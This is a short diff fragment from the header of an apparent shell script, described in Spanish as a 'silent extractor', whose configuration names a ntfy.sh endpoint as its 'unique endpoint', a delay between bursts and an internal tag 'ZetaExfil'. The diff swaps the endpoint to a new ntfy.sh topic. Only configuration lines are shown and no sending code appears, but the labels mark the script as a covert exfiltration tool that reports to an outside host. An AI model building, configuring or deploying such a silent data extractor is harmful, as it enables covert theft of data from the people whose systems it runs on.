@@ -2,7 +2,7 @@
 # Zo – extractor silencioso para Alfa en Zeta 🛰️
 
 # == CONFIG ==
-N="https://ntfy.sh/pe9278301"  # endpoint único
+N="https://ntfy.sh/mnm0893838938"  # endpoint único
 T=10                           # latencia entre ráfagas (seg)
 S="🧟ZetaExfil"                # tag interno
 
